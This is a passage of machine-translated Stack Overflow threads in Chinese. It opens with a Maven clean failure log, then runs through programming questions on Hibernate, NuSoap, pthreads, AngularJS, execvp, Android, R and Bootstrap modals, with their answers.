[DEBUG] Repositories (plugins)     : [apache.snapshots (http://repository.apache.org/content/groups/snapshots-group/, snapshots), central (http://repo.maven.apache.org/maven2, releases)]
[DEBUG] -----------------------------------------------------------------------
[DEBUG] Goal:          org.apache.maven.plugins:maven-clean-plugin:2.4.1:clean (default-clean)
[DEBUG] Style:         Regular
[DEBUG] Configuration: <?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <directory default-value="${project.build.directory}"/>
  <excludeDefaultDirectories default-value="false">${clean.excludeDefaultDirectories}</excludeDefaultDirectories>
  <failOnError default-value="true">${maven.clean.failOnError}</failOnError>
  <followSymLinks default-value="false">${clean.followSymLinks}</followSymLinks>
  <outputDirectory default-value="${project.build.outputDirectory}"/>
  <reportDirectory default-value="${project.reporting.outputDirectory}"/>
  <skip default-value="false">${clean.skip}</skip>
  <testOutputDirectory default-value="${project.build.testOutputDirectory}"/>
  <verbose>${clean.verbose}</verbose>
</configuration>
[DEBUG] =======================================================================
[INFO] 
[INFO] --- maven-clean-plugin:2.4.1:clean (default-clean) @ soft-enrol ---
[DEBUG] Created new class realm maven.api
[DEBUG] Importing foreign packages into class realm maven.api
[DEBUG]   Imported: org.apache.maven.wagon.events < plexus.core
[DEBUG]   Imported: org.sonatype.aether.transfer < plexus.core
[DEBUG]   Imported: org.apache.maven.exception < plexus.core
[DEBUG]   Imported: org.sonatype.aether.metadata < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.util.xml.Xpp3Dom < plexus.core
[DEBUG]   Imported: org.sonatype.aether.collection < plexus.core
[DEBUG]   Imported: org.sonatype.aether.version < plexus.core
[DEBUG]   Imported: org.apache.maven.monitor < plexus.core
[DEBUG]   Imported: org.apache.maven.wagon.repository < plexus.core
[DEBUG]   Imported: org.apache.maven.repository < plexus.core
[DEBUG]   Imported: org.apache.maven.wagon.resource < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.logging < plexus.core
[DEBUG]   Imported: org.apache.maven.profiles < plexus.core
[DEBUG]   Imported: org.sonatype.aether.repository < plexus.core
[DEBUG]   Imported: org.apache.maven.classrealm < plexus.core
[DEBUG]   Imported: org.apache.maven.execution < plexus.core
[DEBUG]   Imported: org.sonatype.aether.artifact < plexus.core
[DEBUG]   Imported: org.sonatype.aether.spi < plexus.core
[DEBUG]   Imported: org.apache.maven.reporting < plexus.core
[DEBUG]   Imported: org.apache.maven.usability < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.container < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.component < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.util.xml.pull.XmlSerializer < plexus.core
[DEBUG]   Imported: org.apache.maven.wagon.authentication < plexus.core
[DEBUG]   Imported: org.apache.maven.lifecycle < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.classworlds < plexus.core
[DEBUG]   Imported: org.sonatype.aether.graph < plexus.core
[DEBUG]   Imported: org.sonatype.aether.* < plexus.core
[DEBUG]   Imported: org.apache.maven.settings < plexus.core
[DEBUG]   Imported: org.codehaus.classworlds < plexus.core
[DEBUG]   Imported: org.sonatype.aether.impl < plexus.core
[DEBUG]   Imported: org.apache.maven.wagon.* < plexus.core
[DEBUG]   Imported: org.apache.maven.toolchain < plexus.core
[DEBUG]   Imported: org.sonatype.aether.deployment < plexus.core
[DEBUG]   Imported: org.apache.maven.wagon.observers < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.util.xml.pull.XmlPullParserException < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.util.xml.pull.XmlPullParser < plexus.core
[DEBUG]   Imported: org.apache.maven.configuration < plexus.core
[DEBUG]   Imported: org.apache.maven.cli < plexus.core
[DEBUG]   Imported: org.sonatype.aether.installation < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.context < plexus.core
[DEBUG]   Imported: org.apache.maven.wagon.authorization < plexus.core
[DEBUG]   Imported: org.apache.maven.project < plexus.core
[DEBUG]   Imported: org.apache.maven.rtinfo < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.lifecycle < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.configuration < plexus.core
[DEBUG]   Imported: org.apache.maven.artifact < plexus.core
[DEBUG]   Imported: org.apache.maven.model < plexus.core
[DEBUG]   Imported: org.apache.maven.* < plexus.core
[DEBUG]   Imported: org.apache.maven.wagon.proxy < plexus.core
[DEBUG]   Imported: org.sonatype.aether.resolution < plexus.core
[DEBUG]   Imported: org.apache.maven.plugin < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.* < plexus.core
[DEBUG]   Imported: org.codehaus.plexus.personality < plexus.core
[DEBUG] Populating class realm maven.api
[DEBUG] org.apache.maven.plugins:maven-clean-plugin:jar:2.4.1:
[DEBUG]    org.apache.maven:maven-plugin-api:jar:2.0.6:compile
[DEBUG]    org.codehaus.plexus:plexus-utils:jar:2.0.5:compile
[DEBUG] Created new class realm plugin>org.apache.maven.plugins:maven-clean-plugin:2.4.1
[DEBUG] Importing foreign packages into class realm plugin>org.apache.maven.plugins:maven-clean-plugin:2.4.1
[DEBUG]   Imported:  < maven.api
[DEBUG] Populating class realm plugin>org.apache.maven.plugins:maven-clean-plugin:2.4.1
[DEBUG]   Included: org.apache.maven.plugins:maven-clean-plugin:jar:2.4.1
[DEBUG]   Included: org.codehaus.plexus:plexus-utils:jar:2.0.5
[DEBUG]   Excluded: org.apache.maven:maven-plugin-api:jar:2.0.6
[DEBUG] Configuring mojo org.apache.maven.plugins:maven-clean-plugin:2.4.1:clean from plugin realm ClassRealm[plugin>org.apache.maven.plugins:maven-clean-plugin:2.4.1, parent: sun.misc.Launcher$AppClassLoader@424b29cf]
[DEBUG] Configuring mojo 'org.apache.maven.plugins:maven-clean-plugin:2.4.1:clean' with basic configurator -->
[DEBUG]   (f) directory = /Users/lingxiubo/Desktop/chenyl/soft-enrol/target
[DEBUG]   (f) excludeDefaultDirectories = false
[DEBUG]   (f) failOnError = true
[DEBUG]   (f) followSymLinks = false
[DEBUG]   (f) outputDirectory = /Users/lingxiubo/Desktop/chenyl/soft-enrol/target/classes
[DEBUG]   (f) reportDirectory = /Users/lingxiubo/Desktop/chenyl/soft-enrol/target/site
[DEBUG]   (f) skip = false
[DEBUG]   (f) testOutputDirectory = /Users/lingxiubo/Desktop/chenyl/soft-enrol/target/test-classes
[DEBUG] -- end configuration --
[INFO] Deleting /Users/lingxiubo/Desktop/chenyl/soft-enrol/target
[INFO] Deleting directory /Users/lingxiubo/Desktop/chenyl/soft-enrol/target/test-classes
[INFO] Deleting dangling symlink /Users/lingxiubo/Desktop/chenyl/soft-enrol/target/soft-enrol/resource/image/login/?????? 1011_theme_asia.jpg
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 0.332s
[INFO] Finished at: Sat Aug 04 15:10:46 CST 2012
[INFO] Final Memory: 7M/101M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-clean-plugin:2.4.1:clean (default-clean) on project soft-enrol: Failed to clean project: Failed to delete /Users/lingxiubo/Desktop/chenyl/soft-enrol/target/soft-enrol/resource/image/login/?????? 1011_theme_asia.jpg -> [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.maven.plugins:maven-clean-plugin:2.4.1:clean (default-clean) on project soft-enrol: Failed to clean project: Failed to delete /Users/lingxiubo/Desktop/chenyl/soft-enrol/target/soft-enrol/resource/image/login/?????? 1011_theme_asia.jpg
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:217)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)
    at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:320)
    at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:156)
    at org.apache.maven.cli.MavenCli.execute(MavenCli.java:537)
    at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:196)
    at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
    at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409)
    at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)
Caused by: org.apache.maven.plugin.MojoExecutionException: Failed to clean project: Failed to delete /Users/lingxiubo/Desktop/chenyl/soft-enrol/target/soft-enrol/resource/image/login/?????? 1011_theme_asia.jpg
    at org.apache.maven.plugin.clean.CleanMojo.execute(CleanMojo.java:188)
    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:101)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:209)
    ... 19 more
Caused by: java.io.IOException: Failed to delete /Users/lingxiubo/Desktop/chenyl/soft-enrol/target/soft-enrol/resource/image/login/?????? 1011_theme_asia.jpg
    at org.apache.maven.plugin.clean.Cleaner.delete(Cleaner.java:227)
    at org.apache.maven.plugin.clean.Cleaner.delete(Cleaner.java:186)
    at org.apache.maven.plugin.clean.Cleaner.delete(Cleaner.java:154)
    at org.apache.maven.plugin.clean.Cleaner.delete(Cleaner.java:154)
    at org.apache.maven.plugin.clean.Cleaner.delete(Cleaner.java:154)
    at org.apache.maven.plugin.clean.Cleaner.delete(Cleaner.java:154)
    at org.apache.maven.plugin.clean.Cleaner.delete(Cleaner.java:154)
    at org.apache.maven.plugin.clean.Cleaner.delete(Cleaner.java:115)
    at org.apache.maven.plugin.clean.CleanMojo.execute(CleanMojo.java:168)
    ... 21 more
[ERROR] 
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException 
```

但是当我使用终端操作时`mvn clean`，它可以工作。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-04T07:59:31.783

看起来您的项目中有一个 Eclipse 无法删除的符号链接（在上面搜索“悬空符号链接”）。尝试手动删除文件一次，并检查它的权限。

从命令行，您以哪个用户身份运行“mvn clean”？

“文件”是指在清理失败之前列出的 jpg 文件。

`Failed to clean project: Failed to delete /Users/lingxiubo/Desktop/chenyl/soft-enrol/target/soft-enrol/resource/image/login/?????? 1011_theme_asia.jpg`

**更新**

最后，事实证明其中一个文件名中有一些特殊字符导致 Eclipse 的 maven 打嗝。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T10:46:42.547

有时，如果在浏览器中打开任何 html 文件并注意到如果您执行 mvn clean.... 它会给出相同的错误。

因此，请确保从浏览器中关闭所有报告文件。然后做清洁。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-24T05:50:50.763

原因 无法在项目上执行目标 org.apache.maven.plugins:maven-clean-plugin:2.4.1:clean (default-clean) *** *Project: 无法清理 project:project 无法删除

方法：Java。exe占用项目的一个jar文件。解决方案并启用 Java 任务管理器。exe，再次执行清理即可

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-08-08T13:57:15.850

在我自己的情况下，我意识到我已经使用了另一个程序（又名文件资源管理器，终端）所描述的此类错误所描述的文件夹。一旦关闭了这个另一个程序，项目编译正确。

# java - Hibernate HQL 查询抛出异常

> ID：11806790
> 
> 赞同：1
> 
> 时间：2012-08-04T07:30:57.680
> 
> 标签：java, hibernate

请帮我解决我的问题 - 如果我在 sqlplus 中运行相同的查询，它工作正常。

```
net.sf.hibernate.QueryException: , expected in SELECT [SELECT SUM(CASE WHEN s.SettlementCurrencyName = r.ContractCurrency THEN p.ContractNet WHEN s.SettlementCurrencyName = r.LocalCurrency THEN p.ContractNet/ta.LiquidationRate WHEN s.SettlementCurrencyName IS NULL THEN p.ContractNet/ta.LiquidationRate ELSE p.ContractNet/ta.LiquidationRate END)"PAID AMOUNT", COUNT(t.TX_IDENTIFIER) "PAID TXS" FROM com.uniteller.txcore.Payment p, com.uniteller.txcore.Transaction t, com.uniteller.txcore.TxAccounting ta, com.uniteller.txcore.Remittance r, com.uniteller.txcore.SellingAgentSettlement s WHERE t.isLRCTx = 1 AND t.SellingCompany = :lrcCode AND s.SettlementCurrencyName(+) = r.ContractCurrency AND s.Id.DestCurrencyName(+) = r.ContractCurrency AND s.Id.Code(+) = r.SellingAgent AND r.ContractCurrency = :contractCurrency AND p.PaidAccountDt > :lastPaidAcDt AND p.TxIdentifier = t.TxIdentifier AND p.TxIdentifier = r.TxIdentifier AND p.TxIdentifier = ta.TxIdentifier]
at net.sf.hibernate.hql.SelectParser.token(SelectParser.java:169)
at net.sf.hibernate.hql.ClauseParser.token(ClauseParser.java:87)
at net.sf.hibernate.hql.ClauseParser.end(ClauseParser.java:114)
at net.sf.hibernate.hql.PreprocessingParser.end(PreprocessingParser.java:143)
at net.sf.hibernate.hql.ParserHelper.parse(ParserHelper.java:30)
at net.sf.hibernate.hql.QueryTranslator.compile(QueryTranslator.java:149)
at net.sf.hibernate.hql.QueryTranslator.compile(QueryTranslator.java:138)
at net.sf.hibernate.impl.SessionFactoryImpl.getQuery(SessionFactoryImpl.java:295)
at net.sf.hibernate.impl.SessionImpl.getQueries(SessionImpl.java:1572)
at net.sf.hibernate.impl.SessionImpl.find(SessionImpl.java:1543)
at net.sf.hibernate.impl.QueryImpl.list(QueryImpl.java:49)
at com.uniteller.tools.databroker.Main.main(Main.java:85) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:50:18.370

我认为问题可能在于您尝试将查询作为 HQL 查询执行：

```
Query query = session.createQuery(...); 
```

但正如我所见，您的查询不是 HQL，这就是为什么您应该将其作为本机 sql 查询执行：

```
SQLQuery query = session.createSQLQuery(...); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T08:14:03.003

)"PAID AMOUNT" 在 ) 和 " 之间需要一个空格

# php - NuSoap 不起作用

> ID：11806792
> 
> 赞同：0
> 
> 时间：2012-08-04T07:31:03.027
> 
> 标签：php, web-services, soap, nusoap

我正在尝试将我的页面连接到网络服务肥皂。我的主机不支持soap，所以无法识别SoapClient。我有一个工作示例可以连接到该 ws，但使用的是 SoapClient。这是：

```
$params = array('location'=>"www.wssite.com/test.php",
                            'trace'=>1,
                            'exceptions'=>1);
$client = new SoapClient("url_of_wsdl",$params);
var_dump($client->__getFunctions());
var_dump($client->__getTypes());

$pars = array('ipcInvocationName' => 'wsinvokeservice',
          'ipcMethodNamespace' => 'svcmsgxml.bldximsgin',
          'ttIn' => array(
          'ttInRow' => array( array('ParPos' => '0','ParNam' => 'MethodName',
              'ParVal' => POST),
           array('ParPos' => '1','ParNam' => 'XMLDocumentIn',
              'ParVal' => 'LoginXmlValue'))),
          'ttOut' => array('ttOutRow' => array(array('ParPos' => '0',
              'ParNam' => 'ContentType','ParVal' => ''),array('ParPos' => '1',
              'ParNam' => 'Result','ParVal' => ''),
               array('ParPos' => '2','ParNam' => 'XMLDocumentOut','ParVal' => '')));

$return = $client->wssigateway($pars); 
```

效果很好！

我以这种方式使用 NuSoap：

```
require_once 'soap/nusoap.php';

$wsdl = 'url_of_wsdl';

$client = new soapclient($wsdl,true);
$err = $client -> getError();
if ($err) {
    echo '<h2>Constructor error</h2><pre>' . $err . '</pre>';
    exit();
}
    $pars = array()//the same as above 
    $result = $client -> call('wssigateway',$pars); 
```

该脚本工作了太多时间，并没有让我得到任何东西..为什么？有人能帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-03T09:59:58.793

尝试`$client = new nusoap_client($wsdl,true);`

代替`$client = new soapclient($wsdl,true);`

# c - pthread 中 PTHREAD_CREATE_JOINABLE 的用途是什么？

> ID：11806793
> 
> 赞同：7
> 
> 时间：2012-08-04T07:31:04.830
> 
> 标签：c, pthreads

我读了一些代码如下：

```
void
mcachefs_file_start_thread()
{
  pthread_attr_t attrs;
  pthread_attr_init(&attrs);
  pthread_attr_setdetachstate(&attrs, PTHREAD_CREATE_JOINABLE);
  pthread_create(&mcachefs_file_threadid, &attrs, mcachefs_file_thread, NULL);
} 
```

在这里，设置`attrs`为的用途是`PTHREAD_CREATE_JOINABLE`什么？此外，它不是由创建的线程的默认属性`pthead_create`吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-04T07:44:07.010

是的，`PTHREAD_CREATE_JOINABLE`是默认属性。目的是它允许你调用[`pthread_join`](http://linux.die.net/man/3/pthread_join)线程，这是一个等待线程完成的函数，如果它的主例程给你返回值。

有时，当你创建一个线程来做一些后台工作时，在你使用它的结果或转移到其他东西之前确保它已经完成可能是个好主意。这就是可连接线程的用途。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-04T07:43:41.900

从 posix 规范来看，新初始化的线程属性对象中分离状态属性的默认设置确实是 PTHREAD_CREATE_JOINABLE。参见例如[http://linux.die.net/man/3/pthread_attr_setdetachstate](http://linux.die.net/man/3/pthread_attr_setdetachstate) 所以你是对的：你的代码片段中不需要 pthread_attr_setdetachstate 代码行。

# angularjs - 如何从 AngularJS 控制器内部更新路由？

> ID：11806797
> 
> 赞同：1
> 
> 时间：2012-08-04T07:31:39.320
> 
> 标签：angularjs

我有一个 AngularJS 应用程序，我想在其中加载一些控制器在启动时发现的插件。为了使插件正常工作，我`$routeProvider`从控制器添加了一些路由，但似乎没有办法做到这一点。

现在我正在使用一个非常丑陋的黑客，如下所示：

```
var routeProvider;
angular.module('example', [], function($routeProvider) {
    routeProvider = $routeProvider;
    // Set up other routes
}

function Controller($http, $location, $timeout) {
    // Use $http to find some plugin
    routeProvider.when(plugin.url, plugin.options);
    // Ugly hack so that the plugin appears if $location.path() already points to it
    var path = $location.path();
    $location.path("/");
    $timeout(function() { $location.path(path); }, 10);
} 
```

如果我不胡说八道，`$timeout`那么如果我在插件的路由处开始（加载页面）它将不会加载（`$route.current`保持空白）。通过路径之间的跳转，路径得到正确解析，插件视图按应有的方式加载。

有没有更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T23:09:38.367

您可以从源代码中撕下 $routeProvider 并制作自己的版本吗？:-)

$routeProvider 只是为您制作的提供程序。[https://github.com/angular/angular.js/blob/master/src/ng/route.js](https://github.com/angular/angular.js/blob/master/src/ng/route.js)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-12T03:20:41.380

我们最终这样做的方式是在我们启动 AngularJS 之前从服务中下载所有路由，然后使用该数据结构来设置路由，然后在我们获得信息并且一切都正确设置后引导 Angular .

唯一的缺点是启动延迟，尤其是当您需要处理多个服务插件时。

# arguments - execvp 没有得到参数

> ID：11806798
> 
> 赞同：0
> 
> 时间：2012-08-04T07:32:24.887
> 
> 标签：arguments, execvp

我的代码是：

```
execvp(command, args); 
```

参数是`char* args[]`

命令是`char* command`

例如 for `ls -l`， command 是 ls 而 args 是 -l 但是为什么在执行之后

`execvp(command, args)`我得到的唯一结果`ls`不是`ls -l`？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T07:36:21.717

参数列表*还*包含程序的名称。确保您的`args`数组同时包含`"ls"`和`"-l"`。

# android - NumberFormat.getCurrencyInstance() 在某些国家/地区是否无法返回正确的符号？

> ID：11806799
> 
> 赞同：1
> 
> 时间：2012-08-04T07:32:42.360
> 
> 标签：android

我开发的金融应用程序应该使用取决于国家/地区的不同货币符号。我正在使用这段代码：

```
Float value = 100;
TextView tv = (TextView) view;
NumberFormat currencyFormat = NumberFormat.getCurrencyInstance();
tv.setText(currencyFormat.format(value)); 
```

我有几份报告说我的应用程序正在返回欧元符号而不是正确的货币（例如在马来西亚或印度）。这些用户声明他们的系统语言是他们国家的本地语言。我无法证明自己，因为我的手机或模拟器上没有这样的语言可用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T14:58:17.883

我想您可以尝试在您的应用程序中强制使用语言环境，因为这似乎与设备上默认语言环境的设置方式有关。看到这些链接 -

[如何从 android Emulator 设置中选择塞尔维亚语？](https://stackoverflow.com/questions/5664361/how-to-choose-serbain-language-from-android-emulator-settings)

[http://www.tutorialforandroid.com/2009/01/force-localize-application-on-android.html](http://www.tutorialforandroid.com/2009/01/force-localize-application-on-android.html)

这可能会帮助您复制用户在其设备上报告的问题。

**编辑：** 我自己没有测试过这个，但它可以在你的情况下工作。

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    String languageToLoad  = "en";
    String countryToLoad = "MY"; // 2 digit country code for Malaysia
    Locale locale = new Locale(languageToLoad, countryToLoad); 
    Locale.setDefault(locale);
    Configuration config = new Configuration();
    config.locale = locale;
    getBaseContext().getResources().updateConfiguration(config, 
    getBaseContext().getResources().getDisplayMetrics());
    this.setContentView(R.layout.main);
} 
```

# javascript - 如何根据浏览器按比例调整文本大小？

> ID：11806800
> 
> 赞同：0
> 
> 时间：2012-08-04T07:32:42.367
> 
> 标签：javascript, css

我想改变字体大小：根据浏览器调整大小文本字体应该改变。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:43:40.597

Prowla 的答案有效，但我发现使用媒体查询更好，因为它更轻巧，易于管理，并且它可以让你熟练掌握更多的东西，而不仅仅是字体大小真的很容易。

[http://css-tricks.com/snippets/css/media-queries-for-standard-devices/](http://css-tricks.com/snippets/css/media-queries-for-standard-devices/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T10:18:44.953

好吧，如果您不需要担心浏览器支持，您可以使用“vh”、“vw”或“vmin”。Chris Coyier 在[http://css-tricks.com/viewport-sized-typography/中解释了它](http://css-tricks.com/viewport-sized-typography/)

# r - 传递对象以返回导致错误

> ID：11806804
> 
> 赞同：6
> 
> 时间：2012-08-04T07:34:27.333
> 
> 标签：r

我希望以下代码返回 95% 置信区间的下限和上限：

```
confint95 = function(mean, se)
{
  confint = abs(se*1.96)
  lower = abs(mean-cint)
  upper = abs(mean+cint)
  return(lower,upper) 
} 
```

但这给出了这个信息：

> 返回错误（下，上）：不允许多参数返回

如何设置函数以返回 95% 置信区间的下限和上限？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-04T07:53:15.493

函数将返回最后一个表达式。如果你想了一会儿没有`return`。如果您将函数作为要评估的最后一个表达式

```
lower, upper 
```

它会产生错误。如果您有 IDE，它也可能会抱怨语法错误。您可以通过将两个元素与`c`@Andrie 指示的 a 组合来解决这个问题。因此，您需要传递一个对象。我经常使用列表来输出不同的数据结构。在您的情况下，向量绰绰有余。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2017-03-29T18:01:42.350

要返回两个或更多结果，请使用“c”

```
dummy <- function(){
  a <- 1
  b <- 22
  return(a,b)
}

dummy()

# Error in return(a, b) : multi-argument returns are not permitted

dummy2 <- function(){
  a <- 1
  b <- 22
  return(c(a,b))
}

dummy2()
# [1]  1 22 
```

# android - MediaStore 找不到 AVI 文件

> ID：11806808
> 
> 赞同：4
> 
> 时间：2012-08-04T07:34:54.837
> 
> 标签：android

我正在尝试通过以下方式查找设备上的所有视频文件

```
 String[] proj =
        { 
        MediaStore.Video.Media._ID,
        MediaStore.Video.Media.DATA,
        MediaStore.Video.Media.DISPLAY_NAME,
        MediaStore.Video.Media.DATE_ADDED,
        MediaStore.Video.Media.SIZE 
        };

    final Uri uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;

    Cursor videocursor = getContentResolver().query(uri,proj, null, null, null); 
```

它发现 mp4 和 3gs 文件没问题，但它没有看到我也有的任何 AVI 文件以及其他视频播放器找到的任何 AVI 文件。

有什么想法可能是错的吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T09:46:19.193

可以在此处指出：默认支持的文件类型不支持**AVI 。**

[http://developer.android.com/guide/appendix/media-formats.html](http://developer.android.com/guide/appendix/media-formats.html)

# c - 退出后更改父进程目录

> ID：11806810
> 
> 赞同：2
> 
> 时间：2012-08-04T07:35:04.213
> 
> 标签：c, chdir

> **可能重复：**
> [如何设置父进程的工作目录？](https://stackoverflow.com/questions/2375003/how-do-i-set-the-working-directory-of-the-parent-process)

程序退出后是否可以使目录更改持续存在？因为程序退出时它会重置为原始目录。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:50:23.483

子进程不能影响其父进程的当前目录，就像它不能真正影响其父进程的[环境](https://stackoverflow.com/questions/205064/is-there-a-way-to-change-another-processs-environment-variables)一样。如果子级删除父级的当前目录，它会使得父级没有命名的当前目录，但仅此而已。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T07:40:04.880

不。您为什么希望目录更改？

# javascript - 一旦已经存在就更改 Bootstrap 模式选项

> ID：11806816
> 
> 赞同：38
> 
> 时间：2012-08-04T07:36:22.753
> 
> 标签：javascript, jquery, jquery-plugins, twitter-bootstrap, modal-dialog

我正在使用[Bootstrap Modal](http://getbootstrap.com/javascript/#modals)。我宣布它，我称之为它，我展示它......一切似乎都很好。

但是，如果我有一个已经存在的模式，之前显示的“键盘”属性为 false，我想随时更改它怎么办？我的意思是：

首先，我创建了一个 Modal 执行此操作（如您所见，我声明了将键盘属性设置为 false 的模态）：

```
$('#myModal').modal({
    show: false,
    backdrop: true,
    keyboard: false
}); 
```

但是随后我声明了这个事件处理程序，这意味着如果发生“某事”，我希望将键盘属性设置为 true。

```
 $('#myModal').on('shown', function(e) {
    if (something){
        $('#myModal').modal({keyboard: true});
    }
 } 
```

所以，当我走

```
$("#myModal").show(); 
```

事件处理程序没有做它应该做的事情，因为一旦按下 Escape 键，我就不会关闭模式。但我完全确定“某事”是真实的，并且我已经检查并重新检查了它`$('#myModal').modal({keyboard: true})`是否已执行。

关于为什么这不更新配置选项的值的任何线索？

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-08-04T18:55:41.607

要更改已启动的 Bootstrap 插件（例如 Modal）的配置设置，您需要访问附加到元素的插件对象，`$('#pluginElement').data['somePlugin']`然后`options`在其中设置。

对于模态，您需要：

```
$('#myModal').data('modal').options.keyboard = true; 
```

## [JSFiddle 演示（旧）](https://jsfiddle.net/mmfansler/DCR4Y/)

* * *

> 对于 Bootstrap 3（如 @Gerald 的评论中所述），您需要`bs.modal`：

```
$('#myModal').data('bs.modal').options.keyboard = true; 
```

## [等待模式示例](http://www.codeply.com/go/cFSzteMbxS)

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2013-12-18T02:11:59.280

有点超出了 OP 的范围，但现在这是我两次搜索相同的解决方案（我的记忆是垃圾），两次我遇到了这个问题，这导致我最终得到答案。我的问题是如何将“可关闭”的已经初始化和显示的模式变成“不可关闭”的模型。即使很少有其他用户需要这个答案，以下是我根据接受的答案所做的：

***使用 bootstrap3**

```
$('#modal').off('keyup.dismiss.bs.modal'); // disable escape key
$('#modal').data('bs.modal').options.backdrop = 'static';
$('#modal button.close').hide(); 
```

请注意，我没有按照上面的建议将 options.keyboard 属性更改为 false（随后调用 escape()）。我无法让它工作，所以在查看 Bootstrap 源代码后，我看到它所做的只是删除了“keyup.dismiss.bs.modal”的事件侦听器。

重新启用事物（在我的场景中，当模型被隐藏时）：

```
$('#modal').on('hidden.bs.modal', function (e) {
    $(this).data('bs.modal').escape(); // reset keyboard
    $(this).data('bs.modal').options.backdrop = true;
    $('button.close', $(this)).show();
}); 
```

这似乎完全笨拙，并且肯定会在即将推出的 Bootstrap 版本中中断，但现在可以使用......

干杯:)

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2018-03-13T02:19:41.667

**对于引导程序4**

要禁用退出按钮上的关闭模式：

```
$('#myModal').off('keydown.dismiss.bs.modal'); 
```

要在单击背景时禁用关闭模式：

```
$('#myModal').data('bs.modal')._config.keyboard = false; 
```

正如 nocturnal 所警告的那样，这可能会在未来版本的引导程序中中断。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2020-08-20T06:33:05.997

**对于引导程序 4.1**

该`options`属性应替换为`_config`。

**例如**

```
const modal = $('#modal');

/*
 |------------------------------------------------------------------------------
 | Now, let us assume you already opened the modal (via js or data attribute).
 | If you want to access the options and modify.
 |------------------------------------------------------------------------------
 */

// [Not Required] Let us see what the object is like.
console.log( modal.data('bs.modal')._config );

// Override the options to lock modal.
modal.data('bs.modal')._config.backdrop = 'static';
modal.data('bs.modal')._config.keyboard = false;

// [optional] You can also hide all data-dismiss buttons too.
modal.find("[data-dismiss='modal']").hide();

// Revert all actions above.
modal.data('bs.modal')._config.backdrop = true;
modal.data('bs.modal')._config.keyboard = true;
modal.find("[data-dismiss='modal']").show(); 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2018-10-19T15:53:36.767

当模态已经打开时，设置背景和 esckey 不关闭模态

```
$('div[name="modal"]').data('bs.modal').options.backdrop = 'static';
$('div[name="modal"]').off('keydown.dismiss.bs.modal'); 
```

取消设置背景和键 esc 目的以不关闭模式

```
$('div[name="user_profile_modal"]').data('bs.modal').options.backdrop = true;
